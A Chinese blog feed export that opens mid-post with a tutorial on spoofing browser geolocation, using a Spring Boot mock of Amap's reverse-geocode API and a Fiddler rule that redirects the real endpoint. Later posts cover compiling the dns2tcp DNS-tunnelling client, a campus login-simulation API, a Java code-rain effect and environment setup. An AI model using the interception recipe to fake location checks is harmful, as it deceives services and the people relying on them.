033015141109160333645149200012074647900sc: 0.004Access-Control-Allow-Origin: *Access-Control-Allow-Methods: *Access-Control-Allow-Headers: DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,key,x-biz,x-info,platinfo,encr,enginever,gzipped,poiidjsonp_98368_(&#123;&apos;status&apos;: &apos;1&apos;, &apos;regeocode&apos;: &#123;&apos;addressComponent&apos;: &#123;&apos;city&apos;: [], &apos;province&apos;: &apos;北京市&apos;, &apos;adcode&apos;: &apos;110108&apos;, &apos;district&apos;: &apos;海淀区&apos;, &apos;towncode&apos;: &apos;110108014000&apos;, &apos;streetNumber&apos;: &#123;&apos;number&apos;: &apos;7号&apos;, &apos;location&apos;: &apos;116.330383,40.008245&apos;, &apos;direction&apos;: &apos;西南&apos;, &apos;distance&apos;: &apos;298.527&apos;, &apos;street&apos;: &apos;荷清路&apos;&#125;, &apos;country&apos;: &apos;中国&apos;, &apos;township&apos;: &apos;清华园街道&apos;, &apos;businessAreas&apos;: [&#123;&apos;location&apos;: &apos;116.341578,39.991180&apos;, &apos;name&apos;: &apos;五道口&apos;, &apos;id&apos;: &apos;110108&apos;&#125;], &apos;building&apos;: &#123;&apos;name&apos;: [], &apos;type&apos;: []&#125;, &apos;neighborhood&apos;: &#123;&apos;name&apos;: &apos;清华大学&apos;, &apos;type&apos;: &apos;科教文化服务;科研机构;科研机构&apos;&#125;, &apos;citycode&apos;: &apos;010&apos;&#125;, &apos;formatted_address&apos;: &apos;北京市海淀区清华园街道清华大学&apos;&#125;, &apos;info&apos;: &apos;OK&apos;, &apos;infocode&apos;: &apos;10000&apos;&#125;) 编写服务器端应用模拟响应报文我使用的是IDE是IntelliJ IDEA 2019.3.3，编程语言是java，另外使用了springboot框架快速构建服务器端应用，当然，你可以选择你熟悉的其他方式，不再赘述相关内容，在此直接贴出controller类的代码 1234567891011121314151617181920212223242526272829303132333435363738394041package wiki.zimo.demo.controller;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.util.Date;@Controllerpublic class TestController &#123; @RequestMapping("/v3/geocode/regeo") public void locate( @RequestParam("key") String key, @RequestParam("s") String s, @RequestParam("language") String language, @RequestParam("location") String location, @RequestParam("extensions") String extensions, @RequestParam("callback") String callback, @RequestParam("platform") String platform, @RequestParam("logversion") String logversion, @RequestParam("appname") String appname, @RequestParam("csid") String csid, @RequestParam("sdkversion") String sdkversion, HttpServletResponse response) throws IOException &#123; response.addHeader("Date", new Date().toGMTString()); response.addHeader("Content-Type", "application/json;charset=utf-8"); response.addHeader("Connection", "close"); response.addHeader("gsid", "011018245168159885414704300017308414815"); response.addHeader("sc", "0.004"); response.addHeader("Access-Control-Allow-Origin", "*"); response.addHeader("Access-Control-Allow-Methods", "*"); response.addHeader("Access-Control-Allow-Headers", "DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type,key,x-biz,x-info,platinfo,encr,enginever,gzipped,poiid"); response.addHeader("Server", "Tengine"); // 下面的json就是你想要伪装的位置 String json = "&#123;'status': '1', 'regeocode': &#123;'addressComponent': &#123;'city': [], 'province': '北京市', 'adcode': '110108', 'district': '海淀区', 'towncode': '110108014000', 'streetNumber': &#123;'number': '7号', 'location': '116.330383,40.008245', 'direction': '西南', 'distance': '298.527', 'street': '荷清路'&#125;, 'country': '中国', 'township': '清华园街道', 'businessAreas': [&#123;'location': '116.341578,39.991180', 'name': '五道口', 'id': '110108'&#125;], 'building': &#123;'name': [], 'type': []&#125;, 'neighborhood': &#123;'name': '清华大学', 'type': '科教文化服务;科研机构;科研机构'&#125;, 'citycode': '010'&#125;, 'formatted_address': '北京市海淀区清华园街道清华大学'&#125;, 'info': 'OK', 'infocode': '10000'&#125;"; response.getWriter().write(callback + String.format("(%s)", json)); &#125;&#125; 修改fiddler自定义规则修改fiddler的自定义规则（快捷键 Ctrl + R），使之劫持请求定位的接口https://restapi.amap.com/v3/geocode/regeo将它定向到请求我们自己编写的模拟响应报文的服务器端应用，从而实现伪装定位的目的，脚本如下（此处我是在OnBeforeRequest方法的最后插入了下面这段脚本，当然，也可以处理其他的，比如处理响应之前的）： 12345var origin_host=&quot;https://restapi.amap.com/v3/geocode/regeo&quot;;var replace_host=&quot;http://localhost:8080/v3/geocode/regeo&quot;;if(oSession.uriContains(origin_host))&#123; oSession.fullUrl = oSession.fullUrl.Replace(origin_host,replace_host);&#125; 下面定位到天安门试试修改服务器端应用，将json替换为你想定位到的地方，并且需要保证是合法的高德地图定位接口所返回的内容，我这里提供一段python脚本，主要功能是利用高德地图的地理/逆地理编码api得到合法的json位置，使用前需要安装python和requests库，参考命令pip install requests，并申请高德地图Web服务应用，获取到相应的key（注意：这个key和上面的Web端的key并不相同） 123# location 就是你想定位到的经纬度坐标，可以使用坐标拾取系统得到res = requests.get('https://restapi.amap.com/v3/geocode/regeo?key=你的key&amp;location=116.403963,39.915119')print(res.json()) 浏览器console输出如下： 1&#123;&quot;type&quot;:&quot;complete&quot;,&quot;info&quot;:&quot;SUCCESS&quot;,&quot;status&quot;:1,&quot;ZDa&quot;:&quot;jsonp_590192_&quot;,&quot;position&quot;:&#123;&quot;Q&quot;:30.58052,&quot;R&quot;:103.9923,&quot;lng&quot;:103.9923,&quot;lat&quot;:30.58052&#125;,&quot;message&quot;:&quot;Get ipLocation success.Get address success.&quot;,&quot;location_type&quot;:&quot;ip&quot;,&quot;accuracy&quot;:null,&quot;isConverted&quot;:true,&quot;addressComponent&quot;:&#123;&quot;citycode&quot;:&quot;010&quot;,&quot;adcode&quot;:&quot;110101&quot;,&quot;businessAreas&quot;:[&#123;&quot;name&quot;:&quot;东单&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.913479,&quot;R&quot;:116.41680400000001,&quot;lng&quot;:116.416804,&quot;lat&quot;:39.913479&#125;&#125;,&#123;&quot;name&quot;:&quot;王府井&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.913505,&quot;R&quot;:116.41203100000001,&quot;lng&quot;:116.412031,&quot;lat&quot;:39.913505&#125;&#125;,&#123;&quot;name&quot;:&quot;东四&quot;,&quot;id&quot;:&quot;110101&quot;,&quot;location&quot;:&#123;&quot;Q&quot;:39.929561,&quot;R&quot;:116.42517099999998,&quot;lng&quot;:116.425171,&quot;lat&quot;:39.929561&#125;&#125;],&quot;neighborhoodType&quot;:&quot;&quot;,&quot;neighborhood&quot;:&quot;&quot;,&quot;building&quot;:&quot;&quot;,&quot;buildingType&quot;:&quot;&quot;,&quot;street&quot;:&quot;东华门大街&quot;,&quot;streetNumber&quot;:&quot;60号&quot;,&quot;country&quot;:&quot;中国&quot;,&quot;province&quot;:&quot;北京市&quot;,&quot;city&quot;:&quot;&quot;,&quot;district&quot;:&quot;东城区&quot;,&quot;township&quot;:&quot;东华门街道&quot;&#125;,&quot;formattedAddress&quot;:&quot;北京市东城区东华门街道东华门大街东华门大街小区&quot;,&quot;roads&quot;:[],&quot;crosses&quot;:[],&quot;pois&quot;:[]&#125; 详细地址如下： 百度地图同理，不再过多赘述enjoy it!!!]]></content>
      <categories>
        <category>爬虫</category>
        <category>抓包</category>
      </categories>
      <tags>
        <tag>fiddler</tag>
        <tag>劫持</tag>
        <tag>伪装位置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows下编译dns2tcp]]></title>
    <url>%2Fposts%2Fb33186a1%2F</url>
    <content type="text"><![CDATA[dns2tcp简介dns2tcp是一款在linux下使用C语言开发的建立dns隧道的开源工具，项目开源地址：https://github.com/alex-sector/dns2tcp 目标用源代码编译出可在windows下运行的dns2tcp的客户端 工具 git Dev C++ 开始 安装git 安装Dev C++ 将Dev C++自带的mingw64的工具目录加入到path环境变量中 在你喜欢的目录，右键，git bash here ，clone 项目到本地 1git clone https://github.com/alex-sector/dns2tcp.git 进入到dns2tcp目录 1cd dns2tcp 执行configure，生成MakeFile，等待命令执行完成之后，进入下一步 1./configure 进入到client目录 1cd client make，在Dev C++自带的mingw64的工具中叫mingw32-make 1mingw32-make 不出意外的话，client目录下应该会出现编译好的dns2tcpc.exe文件 enjoy it!!!]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>dns2tcp</tag>
        <tag>windows</tag>
        <tag>编译</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jupyter初体验]]></title>
    <url>%2Fposts%2F952deeaf%2F</url>
    <content type="text"><![CDATA[前言 Jupyter Notebook是一个非常好用的交互式笔记写作应用，支持运行 40 多种编程语言。本质上是一个 Web 应用程序，便于创建和共享文学化程序文档，支持实时代码，数学方程，可视化和 markdown。 用途包括：数据清理和转换，数值模拟，统计建模，机器学习等等 这篇文章将介绍windows10操作系统下Jupyter Notebook的基本使用，包括，安装，配置，常用快捷键，常用语法等 安装直接使用命令pip install jupyterlab -i https://mirrors.aliyun.com/pypi/simple 配置使用Jupyter Notebook之前，建议先配置python虚拟环境，参考步骤如下（当然，这是可选的，换言之，你可以不接受这个建议）： 安装，命令pip install virtualenvwrapper-win -i https://mirrors.aliyun.com/pypi/simple 自定义安装的虚拟环境路径（可选），配置环境变量WORKON_HOME指向自定义的目录即可 创建虚拟环境，命令mkvirtualenv env_name 退出虚拟环境，命令deactivate 其他常用命令 12workon 查看所有虚拟环境workon env_name 切入该虚拟环境 装虚拟环境有什么用？其实这就相当于在pycharm里面新建工程一样，便于管理该项目的依赖等 使用 命令行执行jupyter notebook即可自动弹出浏览器界面 摸索中 由于内容太多，不打算继续写下去了，可参考https://www.jianshu.com/p/91365f343585]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>Jupyter Notebook</tag>
        <tag>virtualenvwrapper-win</tag>
        <tag>机器学习</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从零开始 部署 wisedu-unified-login-api]]></title>
    <url>%2Fposts%2F6c809f81%2F</url>
    <content type="text"><![CDATA[前言 前段时间写了模拟登陆金智教务统一登陆系统的API项目，GitHub传送门，初始想法是爬金智教务系统，比如获取成绩单等信息，后几经更新，做成了可以完成金智统一认证系统的api，功能更为强大，支持几乎所有接入金智的教务系统，这篇文章就针对目前常见的几种服务器操作系统（windows server、ubantu、centos7），来教大家部署api 申明 在教程开始之前，有必要做个申明，如果你不愿意遵守这个申明，ok，请你离开 不允许使用此项目提供付费的代挂服务，或者任意的收费行为，自愿捐赠除外 请尽量让使用者去GitHub给我点个star，以示对原作者的尊重 教程开始windows server准备 需要以下环境，某盘链接：https://pan.baidu.com/s/1aCfxoIfFc89epLEWzvP7Ug提取码：rodq jdk 1.8 tessdata tomcat 9.0.37 操作步骤 安装jdk，并配置环境变量 1.1 安装没什么好说的，全部默认下一步即可 1.2 配置环境变量，参考环境变量_windows 1.3 验证，打开cmd，输入java -version 配置TESSDATA_PREFIX环境变量，指向tessdata文件夹 部署 3.1 如果你用jar包，那你打开cmd，执行命令java -jar wisedu-unified-login-api-v1.0.jar &amp;，然后就到第4步测试 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐C:\Users\Public 然后将war包，放入tomcat/webapps目录下，进入tomcat/bin目录下，双击startup.bat 测试，打开浏览器，访问http://localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html enjoy it!!! ubantu 安装open-jdk-8，命令sudo apt install openjdk-8-jdk 安装tesseract-ocr，参考ubantu配置安装tesseract-ocr 部署 3.1 如果你用jar包，直接执行命令java -jar wisedu-unified-login-api-v1.0.jar &amp;，然后就到第4步测试 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐~/ 然后将war包，放入tomcat/webapps目录下，进入tomcat/bin目录下，执行./startup.sh，如果提示没有执行权限，请执行sudo chmod 777 *.sh修改权限 测试，命令curl localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html，如果提示未找到curl命令，请执行sudo apt install curl安装 enjoy it!!! centos7 安装open-jdk-8，命令sudo yum install java-1.8.0-openjdk 安装tesseract-ocr，参考ubantu配置安装tesseract-ocr 部署 3.1 如果你用jar包，直接执行命令java -jar wisedu-unified-login-api-v1.0.jar &amp;，然后就到第4步测试 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐~/ 然后将war包，放入tomcat/webapps目录下，进入tomcat/bin目录下，执行./startup.sh，如果提示没有执行权限，请执行sudo chmod 777 *.sh修改权限 测试，命令curl localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html enjoy it!!! 注意：如果要开放外网访问，需要在web控制台配置防火墙开放tcp 8080端口，如果是centos7，还需要操作centos中的防火墙，参考https://jingyan.baidu.com/article/5552ef4796f55e518efbc94f.html]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>部署</tag>
        <tag>java</tag>
        <tag>jar</tag>
        <tag>war</tag>
        <tag>windows server</tag>
        <tag>linux server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[手把手带你用Java写出炫酷的黑客帝国代码雨效果]]></title>
    <url>%2Fposts%2Fa49748b4%2F</url>
    <content type="text"><![CDATA[前言 相信大家都看过黑客帝国，里面炫酷的代码雨一定给大家留下了深刻的印象，今天，博主就带大家用Java来实现这个特效，提前剧透，博主将在这篇博文里写下超详细的实现思路，相信即便是小白也能够看懂，下面我们开始 准备 jdk1.8+ java ide，如idea，或者eclipse 思路 首先确定我们要做的是一个窗体应用程序，在窗体中使用画布，画出我们的代码雨，而java中的窗体应用只需要继承JFrame类即可 JFrame只是单纯的窗体容器，而画布，包含在JPanel组件中，现在我们需要将窗体和画布的大小都设置为电脑屏幕的大小，而除了大小之外，我们还需要对窗体进行一系列的设置，比如不显示标题栏，背景为黑色，鼠标不可见，按esc键退出程序等等，完成这些设置之后，我们的代码是这样的： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364import javax.swing.*;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.event.KeyListener;import java.awt.image.MemoryImageSource;public class Rain extends JFrame &#123; // 屏幕大小 private Dimension screen; // 画布容器 private JPanel graphicsPanel; public Rain() &#123; // 获取屏幕大小 screen = getToolkit().getScreenSize(); // 设置去掉标题栏 setUndecorated(true); // 设置光标不可见 Toolkit defaultToolkit = Toolkit.getDefaultToolkit(); Image image = defaultToolkit.createImage(new MemoryImageSource(0, 0, null, 0, 0)); Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, new Point(0, 0), "cursor"); setCursor(invisibleCursor); // 设置全屏 setSize(screen); // 设置按esc键退出 addKeyListener(new KeyListener() &#123; @Override public void keyTyped(KeyEvent e) &#123; &#125; @Override public void keyPressed(KeyEvent e) &#123; if (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123; System.exit(0); &#125; &#125; @Override public void keyReleased(KeyEvent e) &#123; &#125; &#125;); graphicsPanel = new GraphicsPanel(); // 设置面板 setContentPane(graphicsPanel); // 设置界面可显示 setVisible(true); &#125; private class GraphicsPanel extends JPanel &#123; @Override public void paint(Graphics g) &#123; // 设置背景黑色填充 g.setColor(Color.BLACK); g.fillRect(0, 0, screen.width, screen.height); &#125; &#125; public static void main(String[] args) &#123; new Rain(); &#125;&#125; 现在运行这个程序，不必奇怪，也不必害怕，我们会得到一个纯黑色的界面，我们可以通过按esc键退出程序，或者调出任务管理器杀掉该进程 准备工作做好了，现在我们来分析一下字符雨所具有的一些元素，很明显，我们需要在这个页面上画出一些随机字符，于是我们需要设置字符的大小，需要获取随机的字符，并且需要在页面上画出来，所以我们需要划分一下界面的行和列，基于以上分析，我们先画一个充满了随机字符的页面，于是我们将代码改进成这样： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import javax.swing.*;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.event.KeyListener;import java.awt.image.MemoryImageSource;import java.util.Random;public class Rain extends JFrame &#123; // 屏幕大小 private Dimension screen; // 画布容器 private JPanel graphicsPanel; // 字符大小 private int size = 16; // 划分屏幕区域，行数 private int rows; // 划分屏幕区域，列数 private int cols; // 随机 private Random random = new Random(); public Rain() &#123; // 获取屏幕大小 screen = getToolkit().getScreenSize(); // 设置去掉标题栏 setUndecorated(true); // 设置光标不可见 Toolkit defaultToolkit = Toolkit.getDefaultToolkit(); Image image = defaultToolkit.createImage(new MemoryImageSource(0, 0, null, 0, 0)); Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, new Point(0, 0), "cursor"); setCursor(invisibleCursor); // 设置全屏 setSize(screen); // 设置按esc键退出 addKeyListener(new KeyListener() &#123; @Override public void keyTyped(KeyEvent e) &#123; &#125; @Override public void keyPressed(KeyEvent e) &#123; if (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123; System.exit(0); &#125; &#125; @Override public void keyReleased(KeyEvent e) &#123; &#125; &#125;); graphicsPanel = new GraphicsPanel(); // 设置面板 setContentPane(graphicsPanel); // 设置界面可显示 setVisible(true); // 设置行数和列数 rows = screen.width / size; cols = screen.height / size; &#125; /** * 获取随机ASCII可见字符 * * @return */ private char getRandomChar() &#123; return (char) (new Random().nextInt(94) + 33); &#125; /** * 画布容器 */ private class GraphicsPanel extends JPanel &#123; @Override public void paint(Graphics g) &#123; // 设置背景黑色填充 g.setColor(Color.BLACK); g.fillRect(0, 0, screen.width, screen.height); // 遍历划分的区域，将所有位置填满随机字符 for (int x = 0; x &lt; rows; x++) &#123; for (int y = 0; y &lt; cols; y++) &#123; // 设置随机字符的颜色和字体 g.setColor(Color.CYAN); g.setFont(new Font("黑体", Font.BOLD, size)); // 画 g.drawString(String.valueOf(getRandomChar()), x * size, y * size); &#125; &#125; &#125; &#125; public static void main(String[] args) &#123; new Rain(); &#125;&#125; 现在运行代码，你将会得到类似下面这样的界面，页面是静态的 现在我们来尝试让界面动起来，怎么做呢，很简单，我们可以开一个线程，专门去刷新页面，具体就是定时调用JPanel的repaint方法，于是代码进一步更改成这样了： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129import javax.swing.*;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.event.KeyListener;import java.awt.image.MemoryImageSource;import java.util.Random;public class Rain extends JFrame &#123; // 屏幕大小 private Dimension screen; // 画布容器 private JPanel graphicsPanel; // 字符大小 private int size = 16; // 划分屏幕区域，行数 private int rows; // 划分屏幕区域，列数 private int cols; // 随机 private Random random = new Random(); public Rain() &#123; // 获取屏幕大小 screen = getToolkit().getScreenSize(); // 设置去掉标题栏 setUndecorated(true); // 设置光标不可见 Toolkit defaultToolkit = Toolkit.getDefaultToolkit(); Image image = defaultToolkit.createImage(new MemoryImageSource(0, 0, null, 0, 0)); Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, new Point(0, 0), "cursor"); setCursor(invisibleCursor); // 设置全屏 setSize(screen); // 设置按esc键退出 addKeyListener(new KeyListener() &#123; @Override public void keyTyped(KeyEvent e) &#123; &#125; @Override public void keyPressed(KeyEvent e) &#123; if (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123; System.exit(0); &#125; &#125; @Override public void keyReleased(KeyEvent e) &#123; &#125; &#125;); graphicsPanel = new GraphicsPanel(); // 设置面板 setContentPane(graphicsPanel); // 设置界面可显示 setVisible(true); // 设置行数和列数 rows = screen.width / size; cols = screen.height / size; // 开启定时刷新 new Refresher(100, graphicsPanel).start(); &#125; /** * 获取随机ASCII可见字符 * * @return */ private char getRandomChar() &#123; return (char) (new Random().nextInt(94) + 33); &#125; /** * 画布容器 */ private class GraphicsPanel extends JPanel &#123; @Override public void paint(Graphics g) &#123; // 设置背景黑色填充 g.setColor(Color.BLACK); g.fillRect(0, 0, screen.width, screen.height); // 遍历划分的区域，将所有位置填满随机字符 for (int x = 0; x &lt; rows; x++) &#123; for (int y = 0; y &lt; cols; y++) &#123; // 设置随机字符的颜色和字体 g.setColor(Color.CYAN); g.setFont(new Font("黑体", Font.BOLD, size)); // 画 g.drawString(String.valueOf(getRandomChar()), x * size, y * size); &#125; &#125; &#125; &#125; /** * 定时刷新画布容器 */ private class Refresher extends Thread &#123; private int sleep; private JPanel panel; public Refresher(int sleep, JPanel panel) &#123; this.sleep = sleep; this.panel = panel; &#125; @Override public void run() &#123; // 死循环固定休眠，即可达到定时刷新的效果 while (true) &#123; try &#123; panel.repaint(); Thread.sleep(sleep); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; public static void main(String[] args) &#123; new Rain(); &#125;&#125; 现在运行程序，可以明显看到页面动起来了 现在再来仔细分析一下，黑客帝国的代码雨，可以看到，雨滴是一列一列从屏幕最上面，慢慢的下落到最下面；雨滴的头是和雨滴的身体的颜色不一样；雨滴的长度不会很长；重复这个过程；基于这个过程，我们不难想到将代码改写如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171import wiki.zimo.helper.CharHelper;import javax.swing.*;import java.awt.*;import java.awt.event.KeyEvent;import java.awt.event.KeyListener;import java.awt.image.MemoryImageSource;import java.util.Random;public class Rain extends JFrame &#123; // 屏幕大小 private Dimension screen; // 画布容器 private JPanel graphicsPanel; // 字符大小 private int size = 16; // 划分屏幕区域，行数 private int rows; // 划分屏幕区域，列数 private int cols; // 随机 private Random random = new Random(); // 保存每列字符下落的坐标，雨滴的头的初始坐标——Y坐标 private int[] drops; // 雨滴的身体最大长度 private int maxLength = 30; // 一次下落的最大列数 private int maxDrop = 5; public Rain() &#123; // 获取屏幕大小 screen = getToolkit().getScreenSize(); // 设置去掉标题栏 setUndecorated(true); // 设置光标不可见 Toolkit defaultToolkit = Toolkit.getDefaultToolkit(); Image image = defaultToolkit.createImage(new MemoryImageSource(0, 0, null, 0, 0)); Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, new Point(0, 0), "cursor"); setCursor(invisibleCursor); // 设置全屏 setSize(screen); // 设置按esc键退出 addKeyListener(new KeyListener() &#123; @Override public void keyTyped(KeyEvent e) &#123; &#125; @Override public void keyPressed(KeyEvent e) &#123; if (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123; System.exit(0); &#125; &#125; @Override public void keyReleased(KeyEvent e) &#123; &#125; &#125;); graphicsPanel = new GraphicsPanel(); // 设置面板 setContentPane(graphicsPanel); // 设置界面可显示 setVisible(true); // 设置行数和列数 rows = screen.width / size; cols = screen.height / size; drops = new int[rows]; // 随机drops for (int i = 0; i &lt; drops.length; i++) &#123; drops[i] = random.nextInt(cols); &#125; // 开启定时刷新 new Refresher(100, graphicsPanel).start(); &#125; /** * 获取随机ASCII可见字符 * * @return */ private char getRandomChar() &#123; return (char) (new Random().nextInt(94) + 33); &#125; /** * 画布容器 */ private class GraphicsPanel extends JPanel &#123; @Override public void paint(Graphics g) &#123; // 设置背景黑色填充 Font font = g.getFont(); g.setColor(Color.BLACK); g.fillRect(0, 0, screen.width, screen.height); // 按行遍历 for (int x = 0; x &lt; rows; x++) &#123; // 取出随机的y坐标 int y = drops[x]; // 画出雨滴的头 g.setColor(Color.CYAN); g.setFont(new Font("黑体", Font.BOLD, size)); g.drawString(String.valueOf(CharHelper.getRandomChar()), x * size, y * size); // 倒着往回画出雨滴的身体，颜色渐变 int color = 255; int len = 0; while (--y &gt; 0) &#123; len++; color -= 255 / y; if (color &lt; 0) &#123; color = 0; &#125; g.setFont(font); g.setColor(new Color(0, color, 0, color)); g.drawString(String.valueOf(CharHelper.getRandomChar()), x * size, y * size); if (len &gt;= maxLength) &#123; break; &#125; &#125; // 随机雨滴下落 drops[x] += random.nextInt(maxDrop); // 完全坠落 if (drops[x] &gt;= cols + maxLength) &#123; // 随机开始// drop[x] = random.nextInt(cols); // 从头开始 drops[x] = 0; &#125; &#125; &#125; &#125; /** * 定时刷新画布容器 */ private class Refresher extends Thread &#123; private int sleep; private JPanel panel; public Refresher(int sleep, JPanel panel) &#123; this.sleep = sleep; this.panel = panel; &#125; @Override public void run() &#123; // 死循环固定休眠，即可达到定时刷新的效果 while (true) &#123; try &#123; panel.repaint(); Thread.sleep(sleep); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; &#125; public static void main(String[] args) &#123; new Rain(); &#125;&#125; 最终效果]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>黑客帝国</tag>
        <tag>代码雨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次排查jetbrains系列ide（如idea，pycharm等） alt+f12 快捷键被占用问题解决过程]]></title>
    <url>%2Fposts%2Fb42d5264%2F</url>
    <content type="text"><![CDATA[前言 事件经过：最近不知怎么的了，博主的idea和pycharm等jetbrains系列ide突然都无法使用alt+f12（调出终端的）快捷键了，很让习惯了使用这个快捷键调出终端去执行git或者其他命令的博主不爽，于是便有了下面的探索过程 原因分析显然，无法使用快捷键的原因，明显是快捷键被某个程序占用了，或者说是热键冲突了 解决方案还是那句话，知道了原因之后，解决方案就好办了，大概的思路应该是下面这样 找到占用快捷键的程序，或者说找到快捷键冲突的原因 解决冲突 找到快捷键冲突原因通过搜索，博主发现windows下查看快捷键的工具有很多，比如Hotkey Exporer，PCHunter等等，但这二者都不好用，要么死机，要么驱动加载失败，但幸运的是，功夫不负有心人，最终博主找到了spy++这个强大的工具 下载spy++，某盘链接：https://pan.baidu.com/s/1OlesQcdGJZY2Xq4B-tZtAQ 提取码：46l3 解压到你喜欢的目录下，根据系统架构的不同，直接双击对应的exe执行 打开软件后，选择左上角菜单spy-&gt;log messages，弹出配置消息日志对话框 勾选all windows in system，然后选择message，感觉看文字描述不清晰的小伙伴，就看图 点击clear all，取消选中所有的消息 在上一张图蓝色下拉区域中，下拉到偏后的位置，选中wm_hotkey 然后按被占用的快捷键，我这里是 alt + f12 ，就会在窗体中出现一条消息记录 选中消息，右键点击properties，弹出属性对话框 在属性对话框中，点击蓝色的超链接 window handle 弹出具体的应用窗口属性对话框，在对话框中选择process面板，点击蓝色超链接，就会打开应用进程详情窗口 在应用详情窗口中，model name 就是占用 alt + f12 快捷键的应用的名称 通过搜索，发现这个应用是属于NVIDIA GeForce Experience的一个组件，到这里终于真相大白了 解决快捷键冲突由于经常使用jetbrains系列的ide，已经习惯了，而且如果要调整ide的快捷键，就要调整所有jetbrains系列ide的，比较多，麻烦，所以我选择了调整NVIDIA GeForce Experience的快捷键设置 打开GeForce Experience，点击右上角设置图标 注意到设置中的游戏内覆盖中有提示到按下 alt + z 分享游戏，猜想这里面应该有快捷键设置，点击设置，进入该设置详情 果不其然，在弹出的窗口中，我们发现了键盘快捷键设置按钮，点击它 在弹出来的面板中，我们果然发现了占用快捷键 alt + f12 的操作 点中它，按钮为绿色时，按下你想更新的快捷键（组合键），我这里设置为 shift + alt + f12 打开idea等jetbrains系列ide验证， alt + f12 成功调出终端，问题解决，enjoy！！！]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>快捷键冲突</tag>
        <tag>jetbrains</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[win10下安装cuda+cudnn+pytorch]]></title>
    <url>%2Fposts%2F3908d582%2F</url>
    <content type="text"><![CDATA[准备 桌面右键选择NVIDIA控制面板，然后依次选择帮助-&gt;系统信息-&gt;组件 可以看到我这台笔记本支持的cuda版本是10.2.95，记住这个 然后去nvidia官网下载对应的驱动程序包 然后去下载对应的cudnn，下载cudnn需要NVIDIA账号，如果没有，建议使用163邮箱注册一个（为什么呢？因为QQ邮箱现在收不到NVIDIA的邮件，这就不知道到底是腾讯的问题还是英伟达的问题，亦或者是两者都有问题，手动狗头） 单独提一嘴，如果下载速度很慢的话，不要奇怪，国外的网站是这样的，想提高下载速度，请挂科学上网，或者是自己找大佬们下载好放在网盘里的资源 安装cuda 直接双击运行下载好的exe就行 基本都是下一步下一步下一步，没啥好说的 验证cuda，命令nvcc -V，看到如下图所示就行了 配置cudnn 解压cudnn压缩包 直接 Ctrl + A 全选，然后 Ctrl + C 复制，然后进入C:\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v10.2目录下（请注意根据版本等选择对应的目录，不要无脑就直接用我这个目录）， Ctrl + V 粘贴 安装pytorch 去pytorch官网，根据操作系统，python包管理等选择对应的选项 复制上面选择后出现的安装命令，我这里选的是pip，命令行执行pip install torch===1.5.1 torchvision===0.6.1 -f https://download.pytorch.org/whl/torch_stable.html 等待安装完成，可能会比较慢，请挂科学上网 验证pytorch 进入python交互式解释器，cmd中执行python命令即可 参考官方示例进行验证 官方示例： 1234from __future__ import print_functionimport torchx = torch.rand(5, 3)print(x) 输出： 12345tensor([[0.3380, 0.3845, 0.3217],[0.8337, 0.9050, 0.2650],[0.2979, 0.7141, 0.9069],[0.1449, 0.1132, 0.1375],[0.4675, 0.3947, 0.1426]]) 验证cuda 官方示例： 12import torchtorch.cuda.is_available() 输出： 1True 验证通过，enjoy it!]]></content>
      <categories>
        <category>机器学习</category>
      </categories>
      <tags>
        <tag>机器学习</tag>
        <tag>cuda</tag>
        <tag>pytorch</tag>
        <tag>环境搭建</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubantu配置安装tesseract-ocr]]></title>
    <url>%2Fposts%2Fc417f07b%2F</url>
